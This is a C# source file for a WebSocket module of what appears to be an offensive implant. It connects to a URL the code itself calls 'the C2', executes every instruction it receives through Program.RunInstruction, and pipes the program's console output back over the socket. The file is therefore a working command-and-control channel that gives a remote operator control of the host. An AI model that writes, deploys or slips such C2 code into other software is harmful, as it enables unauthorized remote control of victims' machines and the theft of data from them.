using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Collections.Generic;

namespace Application 
{
    public static class WebsocketModule
    {
        public static Dictionary<string,string> GetInstructions()
        {
            Dictionary<string,string> menuextensions = new Dictionary<string,string>(){
                {"connect", "\tConnect to a Websocket URL (connect ws://127.0.0.1:5001)"}
            };
            return menuextensions;
        }

        public static void Operate(string[] instruction) {
            switch (instruction[0])
            {
                case "connect":
                    string c2url = instruction[1];
                    Console.WriteLine("Connecting to {0}", c2url);
                    WebSocketClient wsc = new WebSocketClient();
                    wsc.Connect(c2url).Wait();
                    break;                             
                default:
                    Console.WriteLine("instruction couldn't be found in Websocket module");
                    break;
            }
        }
    }
    public class WebSocketClient {
        // define an IO for sending responses
        public SocketWriter instructionIO;

        public async Task Connect(string c2url) {
            
            // create a public websocket object
            ClientWebSocket webSocket = new ClientWebSocket();

            // connect to the websocket in configuration
            Console.WriteLine("Linking to the C2 ({0}) via websocket... ",c2url);        
            webSocket.ConnectAsync(new Uri(c2url), CancellationToken.None).Wait();
            bool wsstatus = true;
            Console.WriteLine("The websocket connection is successfully established.");
            // create a new socket IO and assign to instructionIO
            instructionIO = new SocketWriter(webSocket);
            instructionIO.WriteLine("Socket IO initiated.");
            Program.ConsoleIOSet(instructionIO);
            
            try
                {
                    while (webSocket.State == WebSocketState.Open)
                    {
                        

                        // receiving the instruction from websocket
                        byte[] rbuffer = new byte[4000];
                        var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
                        string instruction = Regex.Replace((string)Encoding.UTF8.GetString(rbuffer),"\0", string.Empty);
                        
                        
                        //Console.WriteLine("Got an instruction:\n{0}",instruction);

                        // processing the instruction
                        //string data = InstructionProcess(instruction);
                        Program.RunInstruction(instruction);

                        if (result.MessageType == WebSocketMessageType.Close)
                        {
                            Console.Error.WriteLine("Socket is closing...");
                            await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);                                                
                            Program.ConsoleIOSet(Console.Out);
                        }
                    }
                }
            catch (Exception e)
            {
                Console.Error.WriteLine("The service stopped responding: {0}", e);
                Program.ConsoleIOSet(Console.Out);
                wsstatus = false;
            }
            if (! wsstatus) {
                await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
            }            
        }
    }

    public class SocketWriter : TextWriter
    {
        public ClientWebSocket webSocket;
        
        public SocketWriter(ClientWebSocket ws) {
            this.webSocket = ws;
        }        
        public override Encoding Encoding
        {
            get { return Encoding.Default; }
        }
        public override void Write(string data)
        {
            Send(data).Wait();
        }
        public override void WriteLine(string data)
        {
            Send(data).Wait();
        }
        private async Task Send(string data) {
            // get bytes of the data
            byte[] buffer_bytes = Encoding.UTF8.GetBytes(data+"\n");

            // send the data with buffer header
            //webSocket.SendAsync(new ArraySegment<byte>(buffer_bytes), WebSocketMessageType.Text, true, CancellationToken.None);            
            await webSocket.SendAsync(new ArraySegment<byte>(buffer_bytes), WebSocketMessageType.Text, true, CancellationToken.None);            
        }
    }
}

